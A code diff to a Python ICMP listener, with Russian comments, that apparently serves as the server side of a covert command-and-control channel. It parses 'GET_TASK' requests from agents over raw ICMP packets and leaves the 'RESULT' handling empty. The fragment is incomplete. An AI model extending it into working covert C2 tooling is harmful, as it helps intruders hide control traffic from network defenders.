@@ -24,7 +24,7 @@ def checksum(data):
 def run_icmp(stop_event, task_manager):
 
     with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
-        #bind(), listen() и accept() не используется так как работа идет с сырыми сокетами
+        #bind(), listen() и accept() не используется так как работа идет с сырыми сокетамши
         print("[+/ICMP] icmp-слушатель работает.")
 
         while not stop_event.is_set():
@@ -33,8 +33,13 @@ def run_icmp(stop_event, task_manager):
             icmp_type = ip_packet[ip_len_hdr]
             icmp_payload = ip_packet[ip_len_hdr + 8:]
             
-            print(f"[+/ICMP] Message form agent {address}. Payload:{icmp_payload}. Type: {icmp_type}")
-            
+            if icmp_payload[:8] == "GET_TASK".encode('utf-8'):
+                agent_id = icmp_payload[9:-1].decode('utf-8')
+                print(f"Запрос задачи агентом {agent_id}")
+            elif icmp_payload[:6] == "RESULT".encode('utf-8'):
+                pass
+                
+
             time.sleep(5)
 
     print("[+/ICMP] icmp-слушатель прекратил работу.")
